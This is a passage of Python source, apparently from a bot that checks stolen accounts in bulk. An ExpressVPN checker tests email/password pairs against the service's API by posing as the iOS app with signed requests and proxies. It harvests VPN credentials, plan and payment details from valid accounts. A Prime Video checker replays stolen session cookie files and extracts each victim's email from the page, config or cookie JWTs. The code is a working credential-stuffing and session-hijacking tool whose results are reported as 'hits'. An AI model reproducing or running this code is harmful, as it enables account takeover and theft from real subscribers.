        f"ExpireDate = {account_data.get('expire_date') or 'N/A'} | "
        f"DaysLeft = {account_data.get('days_left') if account_data.get('days_left') is not None else 'N/A'} | "
        f"AutoRenew = {account_data.get('auto_renew') or 'N/A'} | "
        f"PaymentMethod = {account_data.get('payment_method') or 'N/A'} | "
        f"Dev = {EX_DEV_BY}"
    )


def ex_check_one(email: str, password: str, proxy: Optional[str] = None) -> Dict:
    if not _PYCRYPTODOME_OK:
        return {"status": "DEAD", "reason": "pycryptodome_missing", "email": email, "password": password}
    if not _ASN1CRYPTO_OK:
        return {"status": "DEAD", "reason": "asn1crypto_missing", "email": email, "password": password}

    account_data = {
        "email": email, "password": password, "is_premium": False,
        "ovpn_username": None, "ovpn_password": None,
        "pptp_username": None, "pptp_password": None,
        "plan": None, "expire_date": None, "days_left": None,
        "auto_renew": None, "payment_method": None,
    }

    install_id = ex_generate_random_string(64)
    base64_iv = base64.b64encode(ex_get_byte_array(16)).decode("ascii")
    base64_key = base64.b64encode(ex_get_byte_array(16)).decode("ascii")

    post_data = json.dumps({
        "email": email, "iv": base64_iv, "key": base64_key, "password": password,
    })

    try:
        cert_bytes = base64.b64decode(EX_CERT_BASE64)
        gzipped = ex_gzip_data(post_data)
        encrypted_post = ex_envelope_encrypt(gzipped, cert_bytes)
    except Exception as e:
        return {"status": "DEAD", "reason": f"encrypt_fail: {str(e)[:40]}", "email": email, "password": password}

    hmac_key = EX_HMAC_KEY.encode("ascii")
    header_raw = (
        f"POST /apis/v2/credentials?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    header_sig = ex_compute_signature(header_raw.encode("ascii"), hmac_key)
    body_sig = ex_compute_signature(encrypted_post, hmac_key)

    url = (
        f"https://www.expressapisv2.net/apis/v2/credentials"
        f"?client_version=11.5.2&installation_id={install_id}"
        f"&os_name=ios&os_version=14.4"
    )
    headers = {
        "User-Agent": "xvclient/v21.21.0 (ios; 14.4) ui/11.5.2",
        "Expect": "",
        "Content-Type": "application/octet-stream",
        "X-Body-Compression": "gzip",
        "X-Signature": f"2 {header_sig} 91c776e",
        "X-Body-Signature": f"2 {body_sig} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
    }

    proxies = None
    if proxy:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    try:
        response = requests.post(url, data=encrypted_post, headers=headers,
                                 proxies=proxies, timeout=30)
    except requests.exceptions.Timeout:
        return {"status": "RETRY", "reason": "timeout", "email": email, "password": password}
    except Exception as e:
        return {"status": "RETRY", "reason": str(e)[:60], "email": email, "password": password}

    if response.status_code == 429:
        return {"status": "RETRY", "reason": "rate_limited", "email": email, "password": password}
    if response.status_code in (400, 401):
        return {"status": "DEAD", "reason": "bad_credentials", "email": email, "password": password}
    if response.status_code != 200:
        return {"status": "DEAD", "reason": f"http_{response.status_code}", "email": email, "password": password}

    try:
        decrypted = ex_aes_decrypt(
            response.content,
            base64.b64decode(base64_key),
            base64.b64decode(base64_iv),
        )
        body_str = decrypted.decode("ascii")
    except Exception:
        return {"status": "DEAD", "reason": "decrypt_fail", "email": email, "password": password}

    try:
        body_json = json.loads(body_str)
    except Exception:
        return {"status": "DEAD", "reason": "json_parse_fail", "email": email, "password": password}

    access_token = body_json.get("access_token")
    if body_json.get("ovpn_username"):
        account_data["ovpn_username"] = body_json["ovpn_username"]
    if body_json.get("ovpn_password"):
        account_data["ovpn_password"] = body_json["ovpn_password"]
    if body_json.get("pptp_username"):
        account_data["pptp_username"] = body_json["pptp_username"]
    if body_json.get("pptp_password"):
        account_data["pptp_password"] = body_json["pptp_password"]

    if not access_token:
        return {"status": "DEAD", "reason": "no_access_token", "email": email, "password": password}

    sub_raw = (
        f"GET /apis/v2/subscription?access_token={access_token}"
        f"&client_version=11.5.2&installation_id={install_id}"
        f"&os_name=ios&os_version=14.4&reason=activation_with_email"
    )
    sub_sig = ex_compute_signature(sub_raw.encode("ascii"), hmac_key)

    batch_raw = (
        f"POST /apis/v2/batch?client_version=11.5.2"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4"
    )
    batch_sig = ex_compute_signature(batch_raw.encode("ascii"), hmac_key)

    capture_body = json.dumps([{
        "headers": {
            "Accept-Language": "en",
            "X-Signature": f"2 {sub_sig} 91c776e",
        },
        "method": "GET",
        "url": (
            f"/apis/v2/subscription?access_token={access_token}"
            f"&client_version=11.5.2&installation_id={install_id}"
            f"&os_name=ios&os_version=14.4&reason=activation_with_email"
        ),
    }])
    capture_body_sig = ex_compute_signature(capture_body.encode("ascii"), hmac_key)

    batch_url = (
        f"https://www.expressapisv2.net/apis/v2/batch"
        f"?client_version=11.5.2&installation_id={install_id}"
        f"&os_name=ios&os_version=14.4"
    )
    batch_headers = {
        "User-Agent": "xvclient/v21.21.0 (ios wiecz; 14.4) ui/11.5.2",
        "X-Body-Compression": "gzip",
        "X-Signature": f"2 {batch_sig} 91c776e",
        "X-Body-Signature": f"2 {capture_body_sig} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json",
    }

    try:
        batch_resp = requests.post(batch_url, data=capture_body, headers=batch_headers,
                                   proxies=proxies, timeout=30)
    except Exception as e:
        return {"status": "RETRY", "reason": f"batch_{str(e)[:40]}", "email": email, "password": password}

    if batch_resp.status_code == 429:
        return {"status": "RETRY", "reason": "rate_limited", "email": email, "password": password}
    if batch_resp.status_code != 200:
        return {"status": "DEAD", "reason": f"batch_http_{batch_resp.status_code}", "email": email, "password": password}

    try:
        batch_data = batch_resp.json()
    except Exception:
        return {"status": "DEAD", "reason": "batch_json_parse", "email": email, "password": password}

    if batch_data and len(batch_data) > 0:
        item_status = batch_data[0].get("code") or batch_data[0].get("status")
        if item_status == 429:
            return {"status": "RETRY", "reason": "rate_limited", "email": email, "password": password}

    if not batch_data or len(batch_data) == 0:
        return {"status": "DEAD", "reason": "empty_batch", "email": email, "password": password}

    sub_data = batch_data[0].get("body", "{}")
    if isinstance(sub_data, str):
        sub_data = sub_data.replace('\\"', '"')
        try:
            sub_json = json.loads(sub_data)
            if "subscription" in sub_json:
                sub_json = sub_json["subscription"]
            license_status = str(sub_json.get("license_status", "")).upper()

            if "billing_cycle" in sub_json:
                account_data["plan"] = f"{sub_json['billing_cycle']} Month"

            if "expiration_time" in sub_json:
                exp_time = sub_json["expiration_time"]
                account_data["expire_date"] = ex_unix_time_to_date(exp_time)
                current_time = int(datetime.now().timestamp())
                account_data["days_left"] = int((int(exp_time) - current_time) / 86400)

            if "auto_bill" in sub_json:
                account_data["auto_renew"] = str(sub_json["auto_bill"]).lower()

            if "payment_method" in sub_json:
                account_data["payment_method"] = sub_json["payment_method"]

            if license_status == "REVOKED":
                return {
                    "status": "FREE", "email": email, "password": password,
                    "ovpn_username": account_data.get("ovpn_username"),
                    "ovpn_password": account_data.get("ovpn_password"),
                    "pptp_username": account_data.get("pptp_username"),
                    "pptp_password": account_data.get("pptp_password"),
                    "plan": account_data.get("plan"),
                    "expire_date": account_data.get("expire_date"),
                    "days_left": account_data.get("days_left"),
                    "auto_renew": account_data.get("auto_renew"),
                    "payment_method": account_data.get("payment_method"),
                    "content": _ex_build_content(account_data),
                }

            if license_status in ("ACTIVE", "TRIAL", "PAID"):
                if "expiration_time" in sub_json:
                    current_time = int(datetime.now().timestamp())
                    exp_time = int(sub_json["expiration_time"])
                    if exp_time > current_time:
                        account_data["is_premium"] = True
                        return {
                            "status": "PREMIUM", "email": email, "password": password,
                            "ovpn_username": account_data.get("ovpn_username"),
                            "ovpn_password": account_data.get("ovpn_password"),
                            "pptp_username": account_data.get("pptp_username"),
                            "pptp_password": account_data.get("pptp_password"),
                            "plan": account_data.get("plan"),
                            "expire_date": account_data.get("expire_date"),
                            "days_left": account_data.get("days_left"),
                            "auto_renew": account_data.get("auto_renew"),
                            "payment_method": account_data.get("payment_method"),
                            "content": _ex_build_content(account_data),
                        }
        except Exception:
            pass

    return {"status": "DEAD", "reason": "no_valid_subscription", "email": email, "password": password}


def ex_fmt_premium(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {EX_PREMIUM} <b>EXPRESSVPN PREMIUM HIT</b>   ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email     :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Password  :</b> <code>{r.get('password','?')}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EX_SHIELD}  <b>OVPN User :</b> <code>{r.get('ovpn_username','N/A') or 'N/A'}</code>\n"
        f"{EX_KEY}  <b>OVPN Pass :</b> <code>{r.get('ovpn_password','N/A') or 'N/A'}</code>\n"
        f"📡  <b>PPTP User :</b> <code>{r.get('pptp_username','N/A') or 'N/A'}</code>\n"
        f"{EX_KEY}  <b>PPTP Pass :</b> <code>{r.get('pptp_password','N/A') or 'N/A'}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_PLAN}  <b>Plan      :</b> <code>{r.get('plan','N/A') or 'N/A'}</code>\n"
        f"{E_DATE}  <b>Expire    :</b> <code>{r.get('expire_date','N/A') or 'N/A'}</code>\n"
        f"{E_CLOCK}  <b>Days Left :</b> <code>{r.get('days_left','N/A') if r.get('days_left') is not None else 'N/A'}</code>\n"
        f"{E_CLOCK}  <b>Auto Renew:</b> <code>{r.get('auto_renew','N/A') or 'N/A'}</code>\n"
        f"{MSFC_CARD}  <b>Payment   :</b> <code>{r.get('payment_method','N/A') or 'N/A'}</code>"
    )


def ex_fmt_free(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {EX_FREE} <b>EXPRESSVPN FREE</b>       ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email  :</b> <code>{r.get('email','?')}</code>\n"
        f"{E_PLAN}  <b>Pass   :</b> <code>{r.get('password','?')}</code>\n"
        f"{EX_FREE}  <b>Status :</b> <code>Revoked / Expired</code>\n"
        f"{E_DATE}  <b>Expire :</b> <code>{r.get('expire_date','N/A') or 'N/A'}</code>"
    )


def ex_fmt_dead(r: dict) -> str:
    return (
        f"{EX_DEAD}  <b>DEAD — {r.get('email','?')}</b>\n"
        f"<i>{r.get('reason','invalid')}</i>"
    )


def ex_fmt_progress(done: int, total: int, premium: int, free: int, dead: int, retry: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>ExpressVPN Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{EX_PREMIUM} Premium : <b>{premium}</b>\n"
        f"{EX_FREE} Free    : <b>{free}</b>\n"
        f"{EX_DEAD} Dead    : <b>{dead}</b>\n"
        f"{SP_BOLT} Retry   : <b>{retry}</b>"
    )


def ex_fmt_summary(total: int, premium: int, free: int, dead: int, retry: int, elapsed: float) -> str:
    pct = f"{premium / total * 100:.1f}" if total else "0.0"
    return (
        f"{E_CHECK} <b>ExpressVPN Complete!</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{E_COUNT} Total   : <b>{total}</b>\n"
        f"{EX_PREMIUM} Premium : <b>{premium}</b>  (<i>{pct}%</i>)\n"
        f"{EX_FREE} Free    : <b>{free}</b>\n"
        f"{EX_DEAD} Dead    : <b>{dead}</b>\n"
        f"{SP_BOLT} Retry   : <b>{retry}</b>\n"
        f"{E_CLOCK} Time    : <code>{elapsed:.1f}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
    )


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    PRIME VIDEO CHECKER (new)                            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

PV_REQUEST_HEADERS = {
    "Host": "www.primevideo.com",
    "Connection": "keep-alive",
    "device-memory": "4", "sec-ch-device-memory": "4", "dpr": "1", "sec-ch-dpr": "1",
    "viewport-width": "1366", "sec-ch-viewport-width": "1366",
    "rtt": "100", "downlink": "2.7", "ect": "4g",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": '"19.0.0"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"),
    "Accept": ("text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,"
               "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"),
    "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Accept-Encoding": "identity",
}
PV_REQUIRED_AUTH_COOKIE_KEYS = ("session-token", "x-main-av", "at-main", "ubid-main")
PV_DUPLICATE_COOKIE_KEYS = (
    "session-token", "at-main-av", "x-main-av",
    "sess-at-main-av", "ubid-main-av", "session-id",
)
PV_CONFIG_LOGGED_OUT_STATUS = 412
PV_CONFIG_UNAVAILABLE_STATUS = 520
PV_STOREFRONT_TIMEOUT = (8, 15)
PV_CONFIG_TIMEOUT = (5, 8)


def pv_is_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    return bool(re.fullmatch(r"-?\d+", parts[4].strip()))


def pv_convert_json_to_netscape(json_data):
    if isinstance(json_data, dict) and isinstance(json_data.get("cookies"), list):
        json_data = json_data["cookies"]
    if not isinstance(json_data, list):
        raise ValueError("JSON cookie format is invalid")
    lines = []
    for cookie in json_data:
        domain = str(cookie.get("domain", ""))
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = str(cookie.get("path", "/"))
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = cookie.get("expirationDate") or cookie.get("expires") or cookie.get("expiry") or 0
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        lines.append(f"{domain}\t{tail_match}\t{path}\t{secure}\t{int(float(expires))}\t{name}\t{value}")
    return "\n".join(lines)


def pv_normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        if pv_is_netscape_cookie_line(line):
            clean_lines.append(line.strip())
    return "\n".join(clean_lines)


def pv_cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies


def pv_parse_cookie_file(cookie_path):
    with open(cookie_path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()
    try:
        netscape_text = pv_normalize_netscape_cookie_text(
            pv_convert_json_to_netscape(json.loads(content)))
    except Exception:
        netscape_text = pv_normalize_netscape_cookie_text(content)
    cookies = pv_cookies_dict_from_netscape(netscape_text)
    return netscape_text, cookies


def pv_has_required_auth_cookies(cookies):
    return any(key in cookies for key in PV_REQUIRED_AUTH_COOKIE_KEYS)


def pv_extract_with_patterns(text, patterns, default="Unknown"):
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if match:
            value = match.group(1).strip()
            if value:
                return value
    return default


def pv_has_known_value(value):
    normalized = str(value or "").strip()
    return bool(normalized) and normalized.lower() not in {
        "unknown", "unknown⚠️", "none", "null", "n/a",
        "unrecognised", "unrecognized",
    }


def pv_format_region_with_flag(region):
    normalized = str(region or "").strip()
    if not pv_has_known_value(normalized):
        return "Unknown"
    code = normalized.upper()
    if len(code) == 2 and code.isalpha():
        base = ord("A")
        flag = chr(0x1F1E6 + ord(code[0]) - base) + chr(0x1F1E6 + ord(code[1]) - base)
        return f"{code} {flag}"
    return normalized


def pv_build_cookie_signature(cookies):
    signature_parts = []
    for key in PV_DUPLICATE_COOKIE_KEYS:
        value = str(cookies.get(key, "")).strip()
        if value:
            signature_parts.append(f"{key}={value}")
    if not signature_parts:
        return ""
    digest = hashlib.sha256("\n".join(signature_parts).encode("utf-8")).hexdigest()
    return f"cookie:{digest}"


def pv_extract_prime_customer_id(source_text, config_data=None):
    customer_id = ""
    if isinstance(config_data, dict):
        for key in ("customerID", "customerId"):
            if key in config_data and config_data[key]:
                customer_id = str(config_data[key]).strip()
                break
    if pv_has_known_value(customer_id):
        return customer_id
    customer_id = pv_extract_with_patterns(
        source_text,
        [r'"customerID"\s*:\s*"([^"]+)"',
         r'&#34;customerID&#34;\s*:\s*&#34;([^&]+)&#34;'],
        default="",
    )
    return customer_id if pv_has_known_value(customer_id) else ""


def pv_extract_prime_region(source_text, config_data=None):
    region = ""
    if isinstance(config_data, dict) and config_data.get("recordTerritory"):
        region = str(config_data["recordTerritory"]).strip()
    if pv_has_known_value(region):
        return region
    return pv_extract_with_patterns(
        source_text,
        [r'"recordTerritory"\s*:\s*"([^"]+)"',
         r'&#34;recordTerritory&#34;\s*:\s*&#34;([^&]+)&#34;'],
        default="",
    )


def pv_classify_configuration_customer_state(config_data, source_text=""):
    customer_id = ""
    found = False
    if isinstance(config_data, dict):
        for key in ("customerID", "customerId"):
            if key in config_data:
                found = True
                customer_id = str(config_data[key] or "").strip()
                break
    if not found:
        m = re.search(r'"customerID"\s*:\s*"([^"]*)"', source_text or "", re.IGNORECASE)
        if m:
            found = True
            customer_id = m.group(1)
    if not found:
        return "unavailable", customer_id
    if pv_has_known_value(customer_id):
        return "authenticated", customer_id
    return "logged_out", customer_id


def pv_infer_signin_state(source_text, config_data=None, customer_id=""):
    if pv_has_known_value(customer_id):
        return "signed_in"
    if re.search(r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)',
                 source_text, re.IGNORECASE):
        return "signed_in"
    if 'data-testid="pv-nav-sign-out"' in source_text:
        return "signed_in"
    if 'data-testid="active-profile-' in source_text:
        return "signed_in"
    has_signin_link = 'data-testid="pv-nav-sign-in"' in source_text
    has_inactive_profile = 'data-testid="inactive-profile-placeholder"' in source_text
    has_signin_redirect = bool(re.search(r'/auth-redirect/[^"\']*signin=1', source_text, re.IGNORECASE))
    has_signin_form = bool(re.search(r'/(?:ap|gp)/signin|name=["\'](?:email|password)["\']',
                                    source_text, re.IGNORECASE))
    if has_signin_form or (has_signin_link and has_signin_redirect):
        return "sign_in_page"
    if has_inactive_profile and (has_signin_link or has_signin_redirect):
        return "sign_in_page"
    if isinstance(config_data, dict):
        cfg_customer = ""
        for key in ("customerID", "customerId"):
            if key in config_data and config_data[key]:
                cfg_customer = str(config_data[key]).strip()
                break
        if pv_has_known_value(cfg_customer):
            return "signed_in"
    return "unknown"


def pv_infer_prime_video_data(source_text, cookie_file, config_data=None):
    watchlist_match = re.search(
        r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)',
        source_text, re.IGNORECASE)
    watchlist_value = watchlist_match.group(1).lower() if watchlist_match else ""
    if watchlist_value == "true":
        is_paid = True
    elif watchlist_value == "false":
        is_paid = False
    elif re.search(r"subscribe now", source_text, re.IGNORECASE):
        is_paid = False
    else:
        is_paid = None

    profile = pv_extract_with_patterns(
        source_text,
        [r'data-testid="active-profile-([^"]+)"',
         r'"profiles"\s*:\s*\[\{"name":"([^"]+)"',
         r'"displayName":"([^"]+)"'],
        default="",
    )
    region = pv_extract_prime_region(source_text, config_data)
    customer_id = pv_extract_prime_customer_id(source_text, config_data)
    signin_state = pv_infer_signin_state(source_text, config_data, customer_id)
    return {
        "profile": profile,
        "region": region,
        "watchlist_enabled": watchlist_value if watchlist_value else "unknown",
        "is_paid": is_paid,
        "plan": "Paid" if is_paid is True else ("Free" if is_paid is False else "Unknown"),
        "signin_state": signin_state,
        "source_file": cookie_file,
        "customer_id": customer_id,
    }


def pv_get_configuration(session, proxy=None):
    headers = dict(PV_REQUEST_HEADERS)
    headers.update({
        "Host": "atv-ps.primevideo.com",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://www.primevideo.com/region/eu/storefront",
    })
    try:
        response = session.get(
            "https://atv-ps.primevideo.com/acm/GetConfiguration/WebClient?deviceTypeID=AOAGZA014O5RE&deviceID=Web",
            headers=headers, timeout=PV_CONFIG_TIMEOUT, proxies=proxy, allow_redirects=True,
        )
        status_code = response.status_code
        final_url = response.url or ""
        source_text = response.text or ""
        if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
            return {}, 401, source_text
        if status_code != 200:
            return {}, status_code, source_text
        try:
            return response.json() or {}, status_code, source_text
        except Exception:
            match = re.search(r'"recordTerritory"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
            customer_match = re.search(r'"customerID"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
            fallback = {}
            if match:
                fallback["recordTerritory"] = match.group(1).strip()
            if customer_match:
                fallback["customerID"] = customer_match.group(1).strip()
            return fallback, status_code, source_text
    except Exception:
        return {}, None, ""


def pv_get_prime_video_data(session, proxy=None):
    try:
        response = session.get(
            "https://www.primevideo.com/region/eu/storefront",
            headers=PV_REQUEST_HEADERS, timeout=PV_STOREFRONT_TIMEOUT,
            proxies=proxy, allow_redirects=True,
        )
        status_code = response.status_code
        final_url = response.url or ""
        source_text = response.text or ""
    except Exception as e:
        return None, None, {}

    if status_code != 200:
        return None, status_code, {}
    if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
        return source_text, 401, {}

    config_data, config_status, cfg_text = pv_get_configuration(session, proxy)
    if config_status != 200:
        return source_text, config_status, config_data
    customer_state, _ = pv_classify_configuration_customer_state(config_data, cfg_text)
    if customer_state == "logged_out":
        return source_text, PV_CONFIG_LOGGED_OUT_STATUS, config_data
    if customer_state == "unavailable":
        return source_text, PV_CONFIG_UNAVAILABLE_STATUS, config_data
    return source_text, status_code, config_data


def pv_build_duplicate_key(data, cookies):
    customer_id = str(data.get("customer_id") or "").strip().lower()
    if pv_has_known_value(customer_id):
        return f"customer:{customer_id}"
    sig = pv_build_cookie_signature(cookies)
    if sig:
        return sig
    profile = str(data.get("profile") or "").strip().lower()
    region = str(data.get("region") or "").strip().lower()
    parts = tuple(p for p in (profile, region) if pv_has_known_value(p))
    if parts:
        return ("meta",) + parts
    return ""


# ── NEW: multi-source email extraction ────────────────────────────────────
def pv_extract_email(source_text, config_data=None, cookies=None):
    """
    Extract Prime Video account email from:
    1. config JSON (customerEmail / email / userEmail / emailAddress)
    2. Storefront HTML
    3. Cookie JWT (session-token / at-main / x-main payload)
    4. Fallback: cid:<customer_id>
    5. Fallback: 'Unknown'
    """
    cookies = cookies or {}

    # 1. Config JSON — direct
    if isinstance(config_data, dict):
        for key in ("customerEmail", "email", "userEmail", "emailAddress"):
            v = config_data.get(key)
            if v and "@" in str(v):
                return str(v).strip()
        # Recursive nested search
        def _walk(o, d=0):
            if d > 6:
                return None
            if isinstance(o, dict):
                for k, val in o.items():
                    if k in ("customerEmail", "email", "userEmail", "emailAddress"):
                        if val and "@" in str(val):
                            return str(val).strip()
                    r = _walk(val, d + 1)
                    if r:
                        return r
            elif isinstance(o, list):
                for it in o:
                    r = _walk(it, d + 1)
                    if r:
                        return r
            return None
        nested = _walk(config_data)
        if nested:
            return nested

    # 2. HTML
    for pat in [
        r'"customerEmail"\s*:\s*"([^"@\s]+@[^"\s]+)"',
        r'"emailAddress"\s*:\s*"([^"@\s]+@[^"\s]+)"',
        r'"email"\s*:\s*"([^"@\s]+@[^"\s]+)"',
        r'&#34;email&#34;\s*:\s*&#34;([^&@]+@[^&]+)&#34;',
    ]:
        m = re.search(pat, source_text or "", re.IGNORECASE)
        if m:
            v = m.group(1).strip()
            if "@" in v:
                return v

    # 3. Cookie JWT payload decode
    def _decode_jwt(tok):
        try:
            parts = tok.split(".")
            if len(parts) < 2:
                return None
            payload = parts[1]
            payload += "=" * (4 - len(payload) % 4)
            return json.loads(base64.urlsafe_b64decode(payload))
        except Exception:
            return None

    for cname in ("session-token", "at-main", "x-main", "sess-at-main-av"):
        tok = cookies.get(cname, "")
        if not tok or "." not in tok:
            continue
        data = _decode_jwt(tok)
        if not data:
            continue
        for k in ("email", "emailAddress", "preferred_username", "sub", "loginId"):
            v = data.get(k)
            if v and "@" in str(v):
                return str(v).strip()
        for container in ("context", "auth", "user", "profile", "cognito:username"):
            c = data.get(container)
            if isinstance(c, dict):
                for k in ("email", "emailAddress"):
                    v = c.get(k)
                    if v and "@" in str(v):
                        return str(v).strip()

    # 4. Customer ID fallback
    if isinstance(config_data, dict):
        cid = config_data.get("customerID") or config_data.get("customerId")
        if cid:
            return f"cid:{cid}"
    m = re.search(r'"customerID"\s*:\s*"([^"]+)"', source_text or "", re.IGNORECASE)
    if m:
        return f"cid:{m.group(1)}"

    return "Unknown"


def pv_check_one(cookie_path: str, proxy: Optional[str] = None) -> Dict:
    filename = os.path.basename(cookie_path)
    try:
        netscape_content, cookies = pv_parse_cookie_file(cookie_path)
    except Exception as e:
        return {"status": "ERROR", "reason": f"parse: {str(e)[:40]}", "filename": filename, "content": ""}

    if not cookies:
        return {"status": "FAILED", "reason": "no_cookies", "filename": filename, "content": ""}
    if not pv_has_required_auth_cookies(cookies):
        return {"status": "FAILED", "reason": "no_required_auth_cookies",
                "filename": filename, "content": ""}

    session = requests.Session()
    session.cookies.update(cookies)
    session.headers.update({"Accept-Encoding": "identity"})
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    source_text, status_code, config_data = pv_get_prime_video_data(session, proxy=None)

    if source_text:
        data = pv_infer_prime_video_data(source_text, filename, config_data)
        if data.get("signin_state") == "sign_in_page":
            return {"status": "FAILED", "reason": "redirected_to_signin",
                    "filename": filename, "content": netscape_content}
    else:
        data = None

    if status_code == 200 and source_text:
        is_paid = data.get("is_paid")
        if is_paid is None:
            is_paid = False
            data["is_paid"] = False
            data["plan"] = "Free"
        status = "PAID" if is_paid is True else "FREE"
        # FIX: multi-source email extraction
        email = pv_extract_email(source_text, config_data, cookies)
        return {
            "status": status,
            "email": email,
            "profile": data.get("profile", ""),
            "region": data.get("region", "Unknown"),
            "customer_id": data.get("customer_id", ""),
            "plan": data.get("plan", "Unknown"),
            "duplicate_key": pv_build_duplicate_key(data, cookies),
            "filename": filename,
            "content": netscape_content,
        }

    if status_code == PV_CONFIG_UNAVAILABLE_STATUS and data and data.get("signin_state") == "signed_in":
        email = pv_extract_email(source_text or "", config_data, cookies)
        return {
            "status": "UNKNOWN",
            "email": email,
            "profile": data.get("profile", ""),
            "region": data.get("region", "Unknown"),
            "customer_id": data.get("customer_id", ""),
            "plan": "Unknown",
            "duplicate_key": pv_build_duplicate_key(data, cookies),
            "filename": filename,
            "content": netscape_content,
        }

    if status_code in (401, 403, PV_CONFIG_LOGGED_OUT_STATUS):
        return {"status": "FAILED", "reason": f"http_{status_code}",
                "filename": filename, "content": netscape_content}

    return {"status": "ERROR", "reason": f"http_{status_code or 'exception'}",
            "filename": filename, "content": netscape_content}


def pv_fmt_paid(r: dict) -> str:
    return (
        f"╔══════════════════════════════╗\n"
        f"║  {PV_PAID} <b>PRIME VIDEO PAID HIT</b>     ║\n"
        f"╚══════════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
        f"{HS_USER}  <b>Profile :</b> <code>{r.get('profile','N/A') or 'N/A'}</code>\n"
        f"{E_COUNTRY}  <b>Region  :</b> <code>{pv_format_region_with_flag(r.get('region','Unknown'))}</code>\n"
        f"{E_PLAN}  <b>Plan    :</b> <code>{r.get('plan','Paid')}</code>\n"
        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>"
    )


def pv_fmt_free(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {PV_FREE} <b>PRIME VIDEO FREE</b>      ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
        f"{HS_USER}  <b>Profile :</b> <code>{r.get('profile','N/A') or 'N/A'}</code>\n"
        f"{E_COUNTRY}  <b>Region  :</b> <code>{pv_format_region_with_flag(r.get('region','Unknown'))}</code>\n"
        f"{E_PLAN}  <b>Plan    :</b> <code>{r.get('plan','Free')}</code>\n"
        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>"
    )


def pv_fmt_unknown(r: dict) -> str:
    return (
        f"╔═══════════════════════════╗\n"
        f"║  {PV_UNKNOWN} <b>PRIME VIDEO UNKNOWN</b>  ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
        f"{HS_USER}  <b>Profile :</b> <code>{r.get('profile','N/A') or 'N/A'}</code>\n"
        f"{E_COUNTRY}  <b>Region  :</b> <code>{pv_format_region_with_flag(r.get('region','Unknown'))}</code>\n"
        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>"
    )


def pv_fmt_progress(done: int, total: int, paid: int, free: int, unknown: int, dup: int, fail: int) -> str:
    pct = int(done / total * 100) if total else 0
    bar = _pbar(done, total)
    return (
        f"{E_GEAR} <b>Prime Video Checker</b> — Running\n\n"
        f"<code>[{bar}] {pct}%</code>\n"
        f"<b>{done}</b> / <b>{total}</b> checked\n\n"
        f"{PV_PAID} Paid    : <b>{paid}</b>\n"
        f"{PV_FREE} Free    : <b>{free}</b>\n"
